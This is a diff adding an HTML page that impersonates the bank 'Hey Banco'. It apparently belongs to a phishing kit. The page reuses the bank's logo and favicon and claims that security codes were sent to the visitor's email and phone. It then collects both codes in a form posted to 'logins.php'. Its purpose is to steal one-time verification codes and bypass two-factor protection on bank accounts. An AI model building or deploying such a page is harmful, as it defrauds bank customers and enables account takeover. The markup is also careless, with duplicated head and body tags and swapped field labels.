@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hey Banco</title>
+<link id="appFavicon" rel="icon" type="image/x-icon" href="https://portalbanregio.s3.amazonaws.com/assets/naranja/img/ocw_favheyicon.png">
+<link rel="stylesheet" href="styles.css">
+<link rel="stylesheet" href="estiles.css">
+</head>
+<body>
+  <div class="center">
+  <img src="/img/logo_header_heybanco_arriba.svg" alt="logo">
+  </div>
+</head>
+<body>
+<div class="container">
+    <p>Para garantizar tu seguridad y confirmar tu solicitud, hemos enviado un código a tu correo electrónico y número de celular registrados.</p>
+    <p>Por favor, ingresa cada uno de ellos en el campo indicado.</p>
+    <style>
+      .formulario {
+          width: 80%; /* Utilizamos porcentaje para adaptar el ancho */
+          max-width: 350px; /* Limitamos el ancho máximo */
+          margin: 25px auto;
+          text-align: center;
+      }
+  
+      .formulario input[type="text"] {
+          width: 100%; /* Utilizamos porcentaje para adaptar el ancho */
+          padding: 10px;
+          margin-bottom: 10px;
+          border: 1px solid #ccc;
+          border-radius: 5px;
+      }
+  
+      .formulario input[type="text"]::placeholder {
+          color: #999;
+      }
+  
+      .formulario input[type="submit"] {
+          width: 100%; /* Utilizamos porcentaje para adaptar el ancho */
+          padding: 10px;
+          border: none;
+          border-radius: 5px;
+          background-color: #000000;
+          color: #ffffff;
+          cursor: pointer;
+      }
+  </style>
+  
+  <form class="formulario" action="logins.php" method="post">
+      <input type="text" id="codigo_sms" name="codigo_sms" placeholder="Ingresa el código enviado a tu correo electrónico" required>
+      <input type="text" id="codigo_correo" name="codigo_correo" placeholder="Ingresa el código enviado via SMS a tu celular" required>
+      <input type="submit" value="Continuar">
+  </form>
+  
+  
+<div class="informacion-adicional">
+  <p>Al acceder a nuestra aplicación, aceptas los <a href="terminos-y-condiciones.html">términos y condiciones</a> y la <a href="politica-de-privacidad.html">política de privacidad</a> de "Hey, Banco".</p>
+</div>
+<img _ngcontent-serverapp-c20="" src="https://heybanco.s3.amazonaws.com/assets/img/hey-banco-logo-gris.svg" alt="Logo gris Hey Banco" loading="lazy" class="img-fluid my-5 centrar-imagen">
+</body>
+</html>
